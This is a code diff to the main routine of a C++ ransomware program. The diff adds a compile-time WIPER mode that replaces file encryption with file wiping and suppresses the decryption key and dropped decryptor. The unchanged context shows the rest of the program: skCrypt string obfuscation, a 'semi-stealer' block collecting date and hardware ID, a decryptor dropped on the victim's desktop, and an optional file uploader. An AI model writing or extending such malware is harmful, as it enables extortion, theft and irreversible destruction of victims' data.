@@ -59,10 +59,12 @@ int main(int argc, char* argv[]) {
     // retrieve the files to be encrypted
     vector<string> files = GetFiles(dirs);
 
+#if !WIPER
     ofstream checkFile(CHECKSUM_FILE);
     checkFile << CHECK_CONTENT;
     checkFile.close();
     files.push_back(CHECKSUM_FILE);
+#endif
 
     vector<vector<string>> filesSplitted = VectorSplitter(files, MAX_THREADS);
     
@@ -90,7 +92,11 @@ int main(int argc, char* argv[]) {
 
     // open all threads that encrypt files
     for (int i = 0; i < filesSplitted.size(); i++)
+#if WIPER
+        threads[i] = thread(WipeFiles, filesSplitted[i]);
+#else
         threads[i] = thread(EncryptFiles, filesSplitted[i], aes_decrypt(KEYOFKEY, key, IV), aes_decrypt(KEYOFKEY, iv, IV));
+#endif
 
 
     // generate infoFile content
@@ -98,7 +104,9 @@ int main(int argc, char* argv[]) {
 
     // info.txt content
     string info_txt = (string)skCrypt("");
+#if !WIPER
     info_txt += (string)skCrypt("Key: ") + key + (string)skCrypt("\\") + iv + (string)skCrypt("\n");
+#endif
 #if STEAL_INFO   // semi-stealer
     info_txt += (string)skCrypt("Date: ") + GetDate() + (string)skCrypt("\n");
     info_txt += (string)skCrypt("HWID: ") + GetHWID() + (string)skCrypt("\n");
@@ -217,7 +225,7 @@ int main(int argc, char* argv[]) {
     
 
     // drop decryptor.exe
-#if DROP_DECRYPTOR
+#if DROP_DECRYPTOR && !WIPER
     DropFile(DataDecryptorContent, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
 #endif
 
@@ -244,7 +252,12 @@ int main(int argc, char* argv[]) {
     // debug output
 #if DEBUG
     cout << skCrypt("\nEncoded ") << aes_decrypt(KEY, info_txt, IV) << skCrypt("\n");
-    cout << skCrypt("Crypted files:\n") << aes_decrypt(KEY, cryptedFiles_txt, IV) << skCrypt("\n");
+#if WIPER
+    cout << skCrypt("Wiped ");
+#else
+    cout << skCrypt("Crypted ");
+#endif
+    cout << skCrypt("files:\n") << aes_decrypt(KEY, cryptedFiles_txt, IV) << skCrypt("\n");
 #if FILE_UPLOADER
     cout << skCrypt("Links:\n") << aes_decrypt(KEY, links_txt, IV) << skCrypt("\n");
 #endif
